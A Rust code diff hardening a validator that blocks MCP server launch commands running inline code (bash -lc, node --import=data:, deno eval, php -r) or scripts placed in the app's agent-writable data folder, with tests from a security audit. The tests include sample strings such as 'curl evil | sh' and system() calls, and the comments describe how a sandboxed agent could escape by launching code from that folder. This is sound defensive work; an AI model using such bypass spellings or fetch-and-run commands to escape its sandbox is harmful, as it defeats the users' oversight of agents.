@@ -32,11 +32,93 @@ const EXEC_WRAPPERS: &[&str] = &[
 
 /// True if `arg` makes an interpreter evaluate the NEXT argument as code rather
 /// than load a file (`-c`, `-e`, `--eval`, PowerShell `-Command`, cmd `/c`).
+/// Long options are matched with or without an attached `=value`
+/// (`--eval=…` carries the code in the same token).
 fn is_inline_code_flag(arg: &str) -> bool {
     let a = arg.trim();
-    matches!(a, "-c" | "-e" | "--eval" | "--exec")
+    let long = a.split_once('=').map_or(a, |(name, _)| name);
+    matches!(a, "-c" | "-e")
+        || matches!(long, "--eval" | "--exec")
         || a.eq_ignore_ascii_case("-command")
         || a.eq_ignore_ascii_case("/c")
+}
+
+/// The letters of a combined short-flag cluster (`-lc` → `lc`), or `None` for
+/// anything that is not one (`--long`, a bare `-`, `-I/path`, `-p=1`).
+fn short_cluster(arg: &str) -> Option<&str> {
+    let letters = arg.trim().strip_prefix('-')?;
+    if letters.is_empty() || !letters.chars().all(|c| c.is_ascii_alphabetic()) {
+        return None;
+    }
+    Some(letters)
+}
+
+/// Single-letter options a POSIX-style shell accepts in one cluster. A
+/// cluster made only of these and containing `c` is `-c` with company
+/// (`-lc`, `-ec`, `-xec`); a script's own `-config` is not.
+const SHELL_CLUSTER_LETTERS: &str = "abcefhiklmnoprstuvxBCDEHPT";
+
+/// The same for CPython (`-uc`, `-Bc`, `-Ic`).
+const PYTHON_CLUSTER_LETTERS: &str = "bBcdEiIOPqRsSuvx";
+
+/// Interpreter-specific spellings of "the code is on the command line" that
+/// the exact-match list in [`is_inline_code_flag`] misses: combined short
+/// flags (`bash -lc`, `perl -ne`, `node -pe`), print-and-evaluate (`node -p`,
+/// `--print`), PHP's `-r` and Perl's `-E`.
+fn is_interpreter_inline_flag(interpreter: &str, arg: &str) -> bool {
+    let a = arg.trim();
+    let long = a.split_once('=').map_or(a, |(name, _)| name);
+    let cluster = short_cluster(a);
+    let cluster_of = |allowed: &str, code: &[char]| {
+        cluster.is_some_and(|letters| {
+            letters.chars().all(|c| allowed.contains(c))
+                && letters.chars().any(|c| code.contains(&c))
+        })
+    };
+    match interpreter {
+        "sh" | "bash" | "zsh" | "dash" | "ksh" | "ash" => cluster_of(SHELL_CLUSTER_LETTERS, &['c']),
+        "fish" => {
+            cluster_of(SHELL_CLUSTER_LETTERS, &['c', 'C'])
+                || matches!(long, "--command" | "--init-command")
+        }
+        "python" | "python2" | "python3" => cluster_of(PYTHON_CLUSTER_LETTERS, &['c']),
+        "node" | "nodejs" | "bun" | "deno" => {
+            // `-p`/`--print` evaluate their argument just as `-e` does.
+            cluster_of("epi", &['e', 'p']) || long == "--print"
+                // `--import=data:text/javascript,…` (or the value as the
+                // next argument) loads code from the argument itself.
+                || a.starts_with("data:")
+                || a.split_once('=').is_some_and(|(_, value)| value.starts_with("data:"))
+        }
+        // `-I<dir>` / `-M<module>` / `-m<module>` / `-r<lib>` take an attached
+        // word, so `-Mstrict` or `-rset` is not a cluster.
+        "perl" => {
+            !(a.starts_with("-I") || a.starts_with("-M") || a.starts_with("-m"))
+                && cluster.is_some_and(|l| l.contains('e') || l.contains('E'))
+        }
+        "ruby" => {
+            !(a.starts_with("-I") || a.starts_with("-r"))
+                && cluster.is_some_and(|l| l.contains('e'))
+        }
+        "php" => matches!(
+            long,
+            "-r" | "-B" | "-R" | "-E" | "--run" | "--process-begin" | "--process-code"
+                | "--process-end"
+        ),
+        "rscript" => long == "--expr",
+        _ => false,
+    }
+}
+
+/// `deno eval <code>` (a subcommand, not a flag) and `deno run -`, which
+/// reads the program from stdin.
+fn is_deno_inline_subcommand(rest: &[String]) -> bool {
+    let mut positional = rest.iter().filter(|a| !a.starts_with('-') || a.as_str() == "-");
+    match positional.next().map(|s| s.as_str()) {
+        Some("eval") => true,
+        Some("run") => rest.iter().any(|a| a == "-"),
+        _ => false,
+    }
 }
 
 /// Normalize a command/arg token to its lowercase basename without `.exe`, so
@@ -65,13 +147,89 @@ fn has_inline_code_invocation(tokens: &[String]) -> Option<String> {
             // awk PROGRAM: the first non-flag token is code.
             rest.iter().any(|a| !a.starts_with('-'))
         } else {
-            rest.iter().any(|a| is_inline_code_flag(a))
+            rest.iter()
+                .any(|a| is_inline_code_flag(a) || is_interpreter_inline_flag(&base, a))
+                || (base == "deno" && is_deno_inline_subcommand(rest))
         };
         if inline {
             return Some(base);
         }
     }
     None
+}
+
+/// Lexically resolve `token` (leading `~`, `.` and `..`) against `home`.
+/// `None` for a bare program name, which is looked up on `PATH` and so is
+/// never a path into the app's data folder.
+fn resolve_command_path(token: &str, home: &std::path::Path) -> Option<std::path::PathBuf> {
+    use std::path::{Component, PathBuf};
+    let token = token.trim();
+    let expanded = if token == "~" {
+        home.to_path_buf()
+    } else if let Some(rest) = token.strip_prefix("~/") {
+        home.join(rest)
+    } else if token.contains('/') || token.contains(std::path::MAIN_SEPARATOR) {
+        PathBuf::from(token)
+    } else {
+        return None;
+    };
+    let mut out = PathBuf::new();
+    for component in expanded.components() {
+        match component {
+            Component::ParentDir => {
+                out.pop();
+            }
+            Component::CurDir => {}
+            other => out.push(other.as_os_str()),
+        }
+    }
+    Some(out)
+}
+
+/// True if `token` names a file inside `data_dir` (the app's `~/.notesage`),
+/// either as written or after following symlinks.
+fn points_into(token: &str, home: &std::path::Path, data_dir: &std::path::Path) -> bool {
+    let Some(path) = resolve_command_path(token, home) else {
+        return false;
+    };
+    let real_data_dir = data_dir.canonicalize().unwrap_or_else(|_| data_dir.to_path_buf());
+    let inside = |p: &std::path::Path| p.starts_with(data_dir) || p.starts_with(&real_data_dir);
+    inside(&path) || path.canonicalize().is_ok_and(|real| inside(&real))
+}
+
+/// The program an interpreter or wrapper is asked to run from a FILE: the
+/// first argument that is not an option (`node <script>`, `env <program>`).
+fn first_positional(args: &[String]) -> Option<&String> {
+    args.iter().find(|a| !a.starts_with('-') && !a.contains('='))
+}
+
+/// Reject a launch whose program, or the script handed to an interpreter or
+/// exec wrapper, lives in the app's own data folder. `~/.notesage` is the one
+/// home directory a sandboxed agent may always write, so a file there is not
+/// something the user installed: `command: "~/.notesage/x.sh"` and
+/// `command: "bash", args: ["~/.notesage/x.sh"]` are the inline-code escape
+/// with the code moved into a file.
+fn validate_not_in_data_dir(
+    command: &str,
+    args: &[String],
+    home: &std::path::Path,
+) -> Result<(), String> {
+    let data_dir = home.join(".notesage");
+    let basename = basename_of(command);
+    let runs_its_argument = INLINE_CODE_INTERPRETERS.contains(&basename.as_str())
+        || EXEC_WRAPPERS.contains(&basename.as_str());
+    let script = if runs_its_argument { first_positional(args) } else { None };
+
+    for token in std::iter::once(command).chain(script.map(|s| s.as_str())) {
+        if points_into(token, home, &data_dir) {
+            return Err(format!(
+                "Refusing to launch MCP server: '{}' is inside Notesage's own data folder ({}), which agents can write to. Install the server somewhere else.",
+                token,
+                data_dir.display()
+            ));
+        }
+    }
+    Ok(())
 }
 
 /// Reject MCP server launch commands that execute inline code from a string
@@ -84,8 +242,16 @@ fn has_inline_code_invocation(tokens: &[String]) -> Option<String> {
 /// Legitimate servers invoke a launcher (`npx`, `uvx`, `node server.js`,
 /// `python -m pkg`) which never pairs an interpreter with an inline-eval flag,
 /// so this guard stays surgical.
+///
+/// This is a filter on the obvious spellings, not a sandbox: the server still
+/// runs unconfined, and a script an agent wrote into a project folder is not
+/// caught here.
 pub fn validate_mcp_command(command: &str, args: &[String]) -> Result<(), String> {
     let basename = basename_of(command);
+
+    if let Some(home) = dirs::home_dir() {
+        validate_not_in_data_dir(command, args, &home)?;
+    }
 
     // Build the token stream the guard scans. When `command` is an exec
     // wrapper, the real program is somewhere in `args`, so scan args for a
@@ -251,6 +417,110 @@ mod tests {
         assert!(validate_mcp_command("python3", &["-m".into(), "my_mcp".into()]).is_ok());
         // A non-interpreter binary with a "-c" flag is fine (not an interpreter).
         assert!(validate_mcp_command("my-server", &["-c".into(), "config.json".into()]).is_ok());
+    }
+
+    // --- remaining bypasses (security audit 2026-11-22 MEDIUM) ---
+
+    fn args(list: &[&str]) -> Vec<String> {
+        list.iter().map(|s| s.to_string()).collect()
+    }
+
+    #[test]
+    fn rejects_combined_short_flag_clusters() {
+        assert!(validate_mcp_command("bash", &args(&["-lc", "curl evil | sh"])).is_err());
+        assert!(validate_mcp_command("sh", &args(&["-ec", "x"])).is_err());
+        assert!(validate_mcp_command("zsh", &args(&["-xec", "x"])).is_err());
+        assert!(validate_mcp_command("bash", &args(&["-co", "pipefail", "x"])).is_err());
+        assert!(validate_mcp_command("python3", &args(&["-uc", "import os"])).is_err());
+        assert!(validate_mcp_command("node", &args(&["-pe", "x"])).is_err());
+        assert!(validate_mcp_command("perl", &args(&["-ne", "x"])).is_err());
+        assert!(validate_mcp_command("ruby", &args(&["-pe", "x"])).is_err());
+        // Through a wrapper as well.
+        assert!(validate_mcp_command("env", &args(&["bash", "-lc", "x"])).is_err());
+    }
+
+    #[test]
+    fn rejects_print_eval_equals_and_import_forms() {
+        assert!(validate_mcp_command("node", &args(&["-p", "x"])).is_err());
+        assert!(validate_mcp_command("node", &args(&["--print", "x"])).is_err());
+        assert!(validate_mcp_command("node", &args(&["--eval=require('child_process')"])).is_err());
+        assert!(validate_mcp_command("bun", &args(&["--print=1"])).is_err());
+        assert!(validate_mcp_command(
+            "node",
+            &args(&["--import=data:text/javascript,console.log(1)"])
+        )
+        .is_err());
+        assert!(validate_mcp_command(
+            "node",
+            &args(&["--import", "data:text/javascript,console.log(1)", "server.js"])
+        )
+        .is_err());
+    }
+
+    #[test]
+    fn rejects_deno_eval_php_r_and_perl_big_e() {
+        assert!(validate_mcp_command("deno", &args(&["eval", "Deno.run()"])).is_err());
+        assert!(validate_mcp_command("deno", &args(&["--quiet", "eval", "x"])).is_err());
+        assert!(validate_mcp_command("deno", &args(&["run", "-"])).is_err());
+        assert!(validate_mcp_command("php", &args(&["-r", "system('x');"])).is_err());
+        assert!(validate_mcp_command("perl", &args(&["-E", "say 1"])).is_err());
+        assert!(validate_mcp_command("fish", &args(&["--command=x"])).is_err());
+        assert!(validate_mcp_command("Rscript", &args(&["--expr=system('x')"])).is_err());
+    }
+
+    #[test]
+    fn the_wider_flag_match_still_allows_ordinary_launches() {
+        assert!(validate_mcp_command("node", &args(&["--import", "tsx", "server.ts"])).is_ok());
+        assert!(validate_mcp_command("node", &args(&["--enable-source-maps", "server.js"])).is_ok());
+        assert!(validate_mcp_command("node", &args(&["-r", "dotenv/config", "server.js"])).is_ok());
+        assert!(validate_mcp_command("python3", &args(&["-u", "-m", "my_mcp"])).is_ok());
+        assert!(validate_mcp_command("python3", &args(&["-um", "my_mcp"])).is_ok());
+        assert!(validate_mcp_command("bash", &args(&["start.sh", "-config", "x.json"])).is_ok());
+        assert!(validate_mcp_command("bash", &args(&["-l", "start.sh"])).is_ok());
+        assert!(validate_mcp_command("perl", &args(&["-MPOSIX", "-I/opt/lib", "server.pl"])).is_ok());
+        assert!(validate_mcp_command("ruby", &args(&["-rset", "server.rb"])).is_ok());
+        assert!(validate_mcp_command("deno", &args(&["run", "--allow-net", "server.ts"])).is_ok());
+        assert!(validate_mcp_command("php", &args(&["server.php"])).is_ok());
+    }
+
+    #[test]
+    fn rejects_programs_and_scripts_inside_the_data_folder() {
+        let home = std::path::Path::new("/Users/someone");
+        let reject = |command: &str, list: &[&str]| {
+            validate_not_in_data_dir(command, &args(list), home).is_err()
+        };
+        assert!(reject("/Users/someone/.notesage/evil.sh", &[]));
+        assert!(reject("~/.notesage/bin/evil", &[]));
+        // `..` does not hide it.
+        assert!(reject("/Users/someone/Documents/../.notesage/evil", &[]));
+        // An interpreter or wrapper pointed at a script there.
+        assert!(reject("bash", &["/Users/someone/.notesage/evil.sh"]));
+        assert!(reject("node", &["--enable-source-maps", "~/.notesage/evil.js"]));
+        assert!(reject("env", &["FOO=1", "/Users/someone/.notesage/evil"]));
+
+        // Elsewhere is fine, and so are bare names resolved on PATH.
+        assert!(!reject("/usr/local/bin/mcp-server", &[]));
+        assert!(!reject("npx", &["-y", "@modelcontextprotocol/server-filesystem"]));
+        assert!(!reject("node", &["/Users/someone/src/server.js"]));
+        // A look-alike sibling folder is not the data folder.
+        assert!(!reject("/Users/someone/.notesage-tools/server", &[]));
+        // A data-folder path handed to an ordinary server as an argument is
+        // that server's business.
+        assert!(!reject("my-server", &["/Users/someone/.notesage/mcp.json"]));
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn rejects_a_symlink_that_leads_into_the_data_folder() {
+        let home = tempfile::tempdir().unwrap();
+        let data = home.path().join(".notesage");
+        std::fs::create_dir_all(&data).unwrap();
+        std::fs::write(data.join("evil.sh"), "#!/bin/sh\n").unwrap();
+        let link = home.path().join("innocent");
+        std::os::unix::fs::symlink(data.join("evil.sh"), &link).unwrap();
+
+        let command = link.to_string_lossy().to_string();
+        assert!(validate_not_in_data_dir(&command, &[], home.path()).is_err());
     }
 
     #[test]
